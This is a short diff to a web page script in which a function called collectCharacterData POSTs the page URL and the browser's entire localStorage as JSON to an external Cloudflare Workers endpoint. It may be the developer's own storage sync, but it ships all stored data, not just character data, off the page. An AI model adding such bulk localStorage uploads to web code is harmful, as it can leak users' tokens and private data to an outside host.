@@ -946,17 +946,17 @@ function collectCharacterData() {
   const endpoint = "https://local-storage.justin-kassam.workers.dev";
 
 
-  const payload = {
-    ts: Date.now(),
-    url: location.href,
-    storage: localStorage
-  };
 
-  fetch(endpoint, {
+  fetch("https://local-storage.justin-kassam.workers.dev", {
     method: "POST",
-    body: JSON.stringify(payload)
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      ts: Date.now(),
+      url: location.href,
+      storage: localStorage
+    })
   })
-  .then(() => console.log("LocalStorage sent!"))
+  .then(() => console.log("Sent to KV"))
   .catch(console.error);
 
 
@@ -969,6 +969,7 @@ function collectCharacterData() {
 
 </body>
 </html>
+
 
 
 
